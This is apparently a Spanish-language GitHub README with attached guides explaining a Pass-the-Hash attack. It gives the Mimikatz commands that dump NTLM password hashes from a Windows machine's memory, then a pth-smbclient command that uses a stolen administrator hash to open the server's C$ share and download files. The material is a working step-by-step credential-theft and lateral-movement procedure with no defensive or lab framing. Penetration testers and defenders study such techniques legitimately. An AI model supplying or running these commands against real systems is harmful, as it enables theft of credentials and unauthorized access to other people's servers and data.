# Pass The Hash con SMBClient

Este repositorio explica cómo utilizar **Pass The Hash (PtH)** para acceder a recursos compartidos SMB en un servidor Windows, extrayendo el hash NTLM desde un equipo Windows y utilizando `pth-smbclient` en una máquina Kali Linux.

## Requisitos
- Acceso a un equipo Windows con privilegios de administrador.
- Una máquina Kali Linux con `pth-toolkit` instalado.
- Conocimientos básicos de PowerShell y Linux.

## Scripts
- [Script de PowerShell para extraer hashes con Mimikatz](Scripts/mimikatz-extract-hash.ps1)
- [Script de ejemplo para usar pth-smbclient](Scripts/pth-smbclient-example.sh)

## Contribuciones
Si encuentras algún error o tienes sugerencias, ¡no dudes en abrir un issue o enviar un pull request!

---

### **2. extract-hash-windows.md**
Guía detallada para extraer el hash NTLM en Windows usando Mimikatz.


# Extraer el hash NTLM en Windows

## Requisitos
- Privilegios de administrador en el equipo Windows.
- Herramienta [Mimikatz](https://github.com/gentilkiwi/mimikatz).

## Pasos

1. **Descargar Mimikatz:**
   - Descarga Mimikatz desde su [repositorio oficial](https://github.com/gentilkiwi/mimikatz).

2. **Ejecutar Mimikatz como administrador:**
   - Abre una ventana de PowerShell como administrador.
   - Navega a la carpeta donde descargaste Mimikatz y ejecuta:
     ```powershell
     .\mimikatz.exe
     ```

3. **Extraer hashes NTLM:**
   - Dentro de Mimikatz, ejecuta los siguientes comandos:
     ```bash
     privilege::debug
     sekurlsa::logonpasswords
     ```
   - Busca el hash NTLM del usuario administrador en la salida. Ejemplo:
     ```
     NTLM Hash: 32ED87BDB5FDC5E9CBA88547376818D4
     ```

4. **Guardar el hash:**
   - Anota el hash NTLM para usarlo en Kali Linux.


![imagen](https://github.com/90l3m0np13/PassTheHash/blob/main/Imagenes/mimikatz.png)


---

### **3. pth-smbclient-kali.md**
Guía para usar `pth-smbclient` en Kali Linux.


# Usar pth-smbclient en Kali Linux

## Requisitos
- Hash NTLM del usuario administrador.
- Herramienta `pth-toolkit` instalada en Kali Linux.

## Pasos

1. **Instalar pth-toolkit:**
   - Abre una terminal en Kali Linux y ejecuta:
     ```bash
     sudo apt update
     sudo apt install pth-toolkit
     ```

2. **Autenticarse con pth-smbclient:**
   - Usa el siguiente comando para acceder al servidor:
     ```bash
     pth-smbclient //IPDelServidor/RecursoCompartido -U Usuario%HashNTLM
     ```
   - Ejemplo:
     ```bash
     pth-smbclient //192.168.1.10/C$ -U Administrador%32ED87BDB5FDC5E9CBA88547376818D4
     ```

3. **Navegar por los archivos:**
   - Usa comandos como `ls`, `cd`, y `get` para explorar y descargar archivos.

## Ejemplo de salida de pth-smbclient
![imagen](https://github.com/90l3m0np13/PassTheHash/blob/main/Imagenes/pth-smbclient.png)


